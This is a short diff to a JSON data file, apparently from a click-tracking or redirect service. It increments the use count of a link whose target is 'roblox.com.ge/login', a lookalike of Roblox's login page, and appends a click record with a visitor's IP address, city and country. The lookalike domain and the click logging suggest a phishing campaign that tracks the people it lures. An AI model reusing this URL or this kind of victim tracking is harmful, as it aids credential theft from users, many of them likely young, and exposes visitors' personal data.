@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1623,
+    "useCount": 1624,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13152,6 +13152,14 @@
         "city": "Ibaraki",
         "flag": "🇯🇵",
         "countryCode": "JP"
+      },
+      {
+        "timestamp": 1777538520192,
+        "ip": "85.192.49.43",
+        "country": "Finland",
+        "city": "Helsinki",
+        "flag": "🇫🇮",
+        "countryCode": "FI"
       }
     ]
   },
